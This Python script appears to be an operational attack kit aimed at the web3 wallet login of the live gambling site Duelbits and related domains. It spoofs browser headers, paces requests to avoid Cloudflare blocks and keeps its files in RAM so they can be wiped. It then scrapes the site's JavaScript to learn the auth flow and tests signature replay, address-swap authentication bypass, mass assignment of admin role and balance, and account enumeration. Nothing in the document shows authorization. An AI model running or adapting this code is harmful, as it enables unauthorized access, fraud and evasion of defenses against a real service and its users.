#!/usr/bin/env python3
"""
dkv - Duelbits web3 auth-chain kit. Runs on Vermes (clean datacenter vantage).
ALL artifacts stay in /dev/shm/.dkv (RAM tmpfs: gone on reboot, rm -rf = full shred).
Burner key + session token are NEVER printed to stdout - only fingerprints/key-names.

Phases: vantage | determinism | oracle | auth | postauth
Usage: python3 kit.py [phase ...]   (no args = all, in order)
Output: JSON verdict summary on stdout; raw JSONL log in /dev/shm/.dkv/results.jsonl
"""
import json
import os
import random
import re
import secrets
import sys
import time

import requests

BASE_CANDIDATES = ["https://duelbits.com", "https://duelbits.io",
                   "https://sportsbits.com", "https://switchflips.com"]
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
WORK = "/dev/shm/.dkv"
RESULTS = os.path.join(WORK, "results.jsonl")
CONSEC_BLOCK_LIMIT = 3
SLEEP_RANGE = (8.0, 14.0)

consec_blocks = 0
SESSION = requests.Session()


def log(entry):
    entry["t"] = time.strftime("%H:%M:%S")
    with open(RESULTS, "a") as f:
        f.write(json.dumps(entry) + "\n")


def sleep_pace():
    time.sleep(random.uniform(*SLEEP_RANGE))


def headers(base, extra=None):
    h = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Origin": base,
        "Referer": base + "/",
        "Accept-Encoding": "gzip, deflate, br",
    }
    if extra:
        h.update(extra)
    return h


def classify_body(text):
    if "Just a moment" in text or "cf-challenge" in text or "turnstile" in text.lower():
        return "cf_challenge"
    if text.strip().startswith("<!DOCTYPE") or text.strip().startswith("<html"):
        return "html_shell"
    try:
        j = json.loads(text)
        return "json:" + ",".join(sorted(j.keys())) if isinstance(j, dict) else "json:array"
    except Exception:
        return "text:%d" % len(text)


def req(method, url, base, extra_headers=None, body=None, phase="", label=""):
    """Paced request with adaptive backoff + burn detection. Returns (status, text)."""
    global consec_blocks
    sleep_pace()
    try:
        r = SESSION.request(method, url, headers=headers(base, extra_headers),
                            data=body, timeout=20)
    except Exception as e:
        log({"phase": phase, "label": label, "error": str(e)[:120]})
        return None, ""
    status = r.status_code
    klass = classify_body(r.text)
    cookie_names = [c.name for c in r.cookies]
    log({"phase": phase, "label": label, "method": method,
         "url": re.sub(r"0x[0-9a-fA-F]{40}", "0x<addr>", url),
         "status": status, "body_class": klass, "cookies": cookie_names,
         "excerpt": r.text[:180] if klass not in ("cf_challenge",) else "<challenge>"})
    if status in (403, 429) or klass == "cf_challenge":
        consec_blocks += 1
        # burn heat: double pacing
        globals()["SLEEP_RANGE"] = (min(SLEEP_RANGE[0] * 2, 20), min(SLEEP_RANGE[1] * 2, 30))
        if consec_blocks >= CONSEC_BLOCK_LIMIT:
            print(json.dumps({"verdict": "VANTAGE_BURNED",
                              "detail": f"{consec_blocks} consecutive blocks - aborting phase {phase}"}))
            sys.exit(2)
    else:
        consec_blocks = 0
    return status, r.text


def fresh_addr():
    return "0x" + secrets.token_hex(20)


def nonce_of(text):
    m = re.search(r"anyone!\s*(\S+)\s*$", text or "")
    return m.group(1) if m else None


# ---------------------------------------------------------------- phases
def phase_vantage():
    out = {}
    for base in BASE_CANDIDATES[:2]:
        s, t = req("GET", base + "/", base, extra_headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
        }, phase="vantage", label="root " + base)
        out[base] = {"status": s, "class": classify_body(t)}
        if out[base]["class"] == "cf_challenge":
            break  # don't burn siblings
    # message endpoint reachability on first non-challenged base
    base = next((b for b, v in out.items() if v["status"] == 200
                 and v["class"] != "cf_challenge"), BASE_CANDIDATES[0])
    a = fresh_addr()
    s, t = req("POST", f"{base}/auth/web3/message/?publicAddress={a}", base,
               phase="vantage", label="message-endpoint")
    out["message_endpoint"] = {"base": base, "status": s, "class": classify_body(t),
                               "body": t[:300]}
    return out


def phase_determinism(base):
    a = fresh_addr()
    nonces = []
    bodies = []
    for i in range(4):
        s, t = req("POST", f"{base}/auth/web3/message/?publicAddress={a}", base,
                   phase="determinism", label=f"fetch{i+1}")
        bodies.append(t)
        nonces.append(nonce_of(t))
    static = all(b == bodies[0] for b in bodies) if bodies[0] else None
    seq_analysis = {}
    try:
        nums = [int(n) for n in nonces if n and n.isdigit()]
        if len(nums) >= 3:
            diffs = [nums[i + 1] - nums[i] for i in range(len(nums) - 1)]
            seq_analysis = {"diffs": diffs, "uniform": len(set(diffs)) == 1}
    except Exception:
        pass
    return {"address_fingerprint": a[:10] + "...", "nonces": nonces,
            "static_challenge": static, "sequence": seq_analysis}


def phase_oracle(base):
    probes = {
        "fresh1": fresh_addr(),
        "fresh2": fresh_addr(),
        "malformed_short": "0x123",
        "malformed_junk": "zzzz",
        "zero_addr": "0x" + "0" * 40,
    }
    out = {}
    for k, a in probes.items():
        s, t = req("POST", f"{base}/auth/web3/message/?publicAddress={a}", base,
                   phase="oracle", label=k)
        out[k] = {"status": s, "class": classify_body(t), "body": t[:220]}
    out["fresh_shape_identical"] = (
        out["fresh1"]["status"] == out["fresh2"]["status"]
        and out["fresh1"]["class"] == out["fresh2"]["class"])
    return out


def _sign(message_hex, key):
    from eth_account import Account
    from eth_account.messages import encode_defunct
    # duelbits SPA signs personal_sign(utf8ToHex(msg)) - hex-decoded bytes form the message
    md = encode_defunct(hexstr=message_hex)
    signed = Account.sign_message(md, key)
    sig = signed.signature.hex()
    return sig if sig.startswith("0x") else "0x" + sig


def _sign_text(message, key):
    from eth_account import Account
    from eth_account.messages import encode_defunct
    signed = Account.sign_message(encode_defunct(text=message), key)
    sig = signed.signature.hex()
    return sig if sig.startswith("0x") else "0x" + sig


def phase_bundle(base):
    """Mine the SPA for the REAL web3 auth request shape (field names + signing mode)."""
    out = {}
    code = ""
    entry = []
    for b in dict.fromkeys([base, "https://duelbits.io"]):
        s, t = req("GET", b + "/", b, extra_headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        }, phase="bundle", label="shell:" + b.split("//")[1])
        tt = t or ""
        out["shell:" + b.split("//")[1]] = {
            "status": s, "class": classify_body(tt),
            "script_srcs": re.findall(r"<script[^>]*src=\"([^\"]+)\"", tt)[:12],
            "link_js": re.findall(r"<link[^>]*href=\"([^\"]+\.js)\"", tt)[:12],
            "any_js_refs": re.findall(r"[\"']([^\"' ]{4,120}?\.js[^\"' ]{0,20})[\"']", tt)[:24],
            "title": re.findall(r"<title[^>]*>(.*?)</title>", tt, re.S)[:1],
        }
        entry += re.findall(r"[\"']([^\"' ]*assets/[A-Za-z0-9_.-]+\.js)[\"']", tt)
    out["entry_candidates"] = entry[:12]
    for e in entry[:3]:
        u = e if e.startswith("http") else base + (e if e.startswith("/") else "/" + e)
        s2, t2 = req("GET", u, base, phase="bundle", label="entry:" + e[-20:])
        code += t2 or ""
    names = sorted(set(re.findall(
        r'[\"\'](?:\./)?[A-Za-z0-9_/.-]*assets/([A-Za-z0-9_.-]*web3[A-Za-z0-9_.-]*\.js)[\"\']',
        code)))
    if not names:
        names = sorted(set(re.findall(
            r'[\"\']([A-Za-z0-9_.-]*web3[A-Za-z0-9_.-]*\.js)[\"\']', code)))
    out["web3_chunks"] = names
    excerpts = {}
    for n in names[:3]:
        s3, t3 = req("GET", base + "/assets/" + n, base, phase="bundle", label="chunk:" + n[:28])
        t = t3 or ""
        for pat in (r'.{100}auth/web3.{300}', r'.{140}utf8ToHex.{140}',
                    r'.{80}personal_sign.{160}'):
            for m in re.finditer(pat, t):
                excerpts.setdefault(n, []).append(m.group(0)[:400])
    out["excerpts"] = excerpts
    return out


def phase_auth(base):
    from eth_account import Account
    burner = Account.create()
    with open(os.path.join(WORK, "burner.json"), "w") as f:
        json.dump({"address": burner.address, "key": burner.key.hex()}, f)
    os.chmod(os.path.join(WORK, "burner.json"), 0o600)
    addr = burner.address.lower()

    s, msg = req("POST", f"{base}/auth/web3/message/?publicAddress={addr}", base,
                 phase="auth", label="challenge-fetch")
    if not msg:
        return {"error": "no challenge body", "status": s}
    msg_hex = msg.strip().encode("utf-8").hex()

    out = {"address_fp": addr[:10] + "...", "challenge_status": s}
    sig = _sign(msg_hex, burner.key)
    from eth_utils import to_checksum_address
    cs = to_checksum_address(addr)
    s_cs, msg_cs = req("POST", f"{base}/auth/web3/message/?publicAddress={cs}", base,
                       phase="auth", label="challenge-fetch-checksummed")
    sig_cs = _sign((msg_cs or "").strip().encode("utf-8").hex(), burner.key)
    sig_cs_text = _sign_text((msg_cs or "").strip(), burner.key)
    sig_text = _sign_text(msg.strip(), burner.key)
    attempts = [
        ("client-exact-lower", f"{base}/auth/web3?",
         {"address": addr, "signature": sig}),
        ("checksummed", f"{base}/auth/web3?",
         {"address": cs, "signature": sig_cs}),
        ("checksummed-texthex", f"{base}/auth/web3?",
         {"address": cs, "signature": sig_cs_text}),
        ("lower-textsig", f"{base}/auth/web3?",
         {"address": addr, "signature": sig_text}),
    ]
    s2, t2, body = None, "", ""
    for label, url, b in attempts:
        body = json.dumps(b)
        s2, t2 = req("POST", url, base,
                     extra_headers={"Content-Type": "application/json"},
                     body=body, phase="auth", label="auth-submit:" + label)
        out["auth_status"] = s2
        out["auth_class"] = classify_body(t2)
        out["auth_body_excerpt"] = re.sub(r"(eyJ[A-Za-z0-9_-]{10})[A-Za-z0-9._-]+", r"\1<jwt>", t2)[:220]
        if s2 in (200, 201):
            break
    # same-challenge double-submit: did the challenge get consumed at all?
    if s2 not in (200, 201) and body:
        s3, t3 = req("POST", url, base,
                     extra_headers={"Content-Type": "application/json"},
                     body=body, phase="auth", label="same-challenge-resubmit")
        out["resubmit_status"] = s3
        out["resubmit_class"] = classify_body(t3)
        out["resubmit_excerpt"] = re.sub(r"(eyJ[A-Za-z0-9_-]{10})[A-Za-z0-9._-]+", r"\1<jwt>", t3)[:220]
    if s2 in (200, 201):
        with open(os.path.join(WORK, "session.json"), "w") as f:
            json.dump({"address": addr, "signature": sig, "auth_body": body,
                       "auth_response": json.loads(t2) if classify_body(t2).startswith("json:") else {}}, f)
        os.chmod(os.path.join(WORK, "session.json"), 0o600)
        out["session_saved"] = True
    return out


def phase_replay(base):
    try:
        with open(os.path.join(WORK, "session.json")) as f:
            sess = json.load(f)
    except Exception:
        return {"skipped": "no session - auth phase did not mint one"}
    out = {"address_fp": sess["address"][:10] + "..."}
    for i in (2, 3):  # replays #2 and #3 of the SAME signature
        s, t = req("POST", f"{base}/auth/web3", base,
                   extra_headers={"Content-Type": "application/json"},
                   body=sess["auth_body"], phase="replay", label=f"replay{i}")
        out[f"replay{i}_status"] = s
        out[f"replay{i}_class"] = classify_body(t)
        out[f"replay{i}_excerpt"] = re.sub(r"(eyJ[A-Za-z0-9_-]{10})[A-Za-z0-9._-]+", r"\1<jwt>", t)[:200]
    statuses = [out.get(f"replay{i}_status") for i in (2, 3)]
    out["verdict"] = ("REPLAY_CONFIRMED" if all(x in (200, 201) for x in statuses)
                      else "nonce_single_use" if all(x not in (200, 201) and x is not None for x in statuses)
                      else "inconclusive")
    return out


def phase_binding_swap(base):
    try:
        with open(os.path.join(WORK, "session.json")) as f:
            sess = json.load(f)
    except Exception:
        return {"skipped": "no session"}
    b = json.loads(sess["auth_body"])
    b["address"] = fresh_addr()
    s, t = req("POST", f"{base}/auth/web3", base,
               extra_headers={"Content-Type": "application/json"},
               body=json.dumps(b), phase="binding", label="address-swap")
    return {"swap_status": s, "swap_class": classify_body(t),
            "verdict": "BINDING_BROKEN_AUTH_BYPASS" if s in (200, 201) else "binding_holds"}


def phase_state_forward(base):
    try:
        with open(os.path.join(WORK, "session.json")) as f:
            sess = json.load(f)
    except Exception:
        return {"skipped": "no session"}
    b = json.loads(sess["auth_body"])
    b.update({"isAdmin": True, "role": "admin", "balance": 999999, "vipLevel": 99})
    q = "?isAdmin=true&role=admin&balance=999999&vipLevel=99"
    s, t = req("POST", f"{base}/auth/web3{q}", base,
               extra_headers={"Content-Type": "application/json"},
               body=json.dumps(b), phase="state_forward", label="mass-assign")
    out = {"status": s, "class": classify_body(t),
           "resp_keys": sorted(json.loads(t).keys()) if classify_body(t).startswith("json:") else []}
    # what did the session keep? probe candidate user endpoints (names only, no values)
    tok = None
    try:
        auth_resp = sess["auth_response"]
        for k in ("accessToken", "access_token", "token", "jwt"):
            if isinstance(auth_resp, dict) and k in auth_resp:
                tok = auth_resp[k]
    except Exception:
        pass
    if tok:
        for ep in ("/auth/me", "/ws/me", "/auth/user", "/user/me", "/ws/user"):
            s2, t2 = req("GET", base + ep, base,
                         extra_headers={"Authorization": "Bearer " + tok},
                         phase="state_forward", label="me:" + ep)
            klass = classify_body(t2)
            fields = []
            if klass.startswith("json:"):
                try:
                    fields = sorted(json.loads(t2).keys())
                except Exception:
                    pass
            out["me:" + ep] = {"status": s2, "class": klass, "fields": fields}
            if s2 == 200:
                break
    return out


def phase_postauth_oracle(base):
    try:
        with open(os.path.join(WORK, "burner.json")) as f:
            known = json.load(f)["address"].lower()
    except Exception:
        return {"skipped": "no burner"}
    out = {}
    for label, a in (("registered", known), ("unregistered", fresh_addr())):
        s, t = req("POST", f"{base}/auth/web3/message/?publicAddress={a}", base,
                   phase="postauth_oracle", label=label)
        out[label] = {"status": s, "class": classify_body(t), "body": t[:200]}
    out["verdict"] = ("ENUM_ORACLE" if out["registered"]["status"] != out["unregistered"]["status"]
                      or out["registered"]["class"] != out["unregistered"]["class"]
                      else "no_oracle")
    return out


PHASES = [
    ("vantage", phase_vantage),
    ("bundle", lambda base: phase_bundle(base)),
    ("determinism", lambda base: phase_determinism(base)),
    ("oracle", lambda base: phase_oracle(base)),
    ("auth", lambda base: phase_auth(base)),
    ("replay", lambda base: phase_replay(base)),
    ("binding", lambda base: phase_binding_swap(base)),
    ("state_forward", lambda base: phase_state_forward(base)),
    ("postauth_oracle", lambda base: phase_postauth_oracle(base)),
]


def main():
    os.makedirs(WORK, exist_ok=True)
    wanted = sys.argv[1:] or [name for name, _ in PHASES]
    vantage = phase_vantage()
    base = (os.environ.get("KIT_BASE")
            or (vantage.get("message_endpoint") or {}).get("base", BASE_CANDIDATES[0]))
    results = {"vantage": vantage}
    for name, fn in PHASES[1:]:
        if name not in wanted:
            continue
        try:
            results[name] = fn(base)
        except SystemExit:
            raise
        except Exception as e:
            results[name] = {"error": repr(e)[:200]}
    print(json.dumps(results, indent=1)[:6000])


if __name__ == "__main__":
    main()
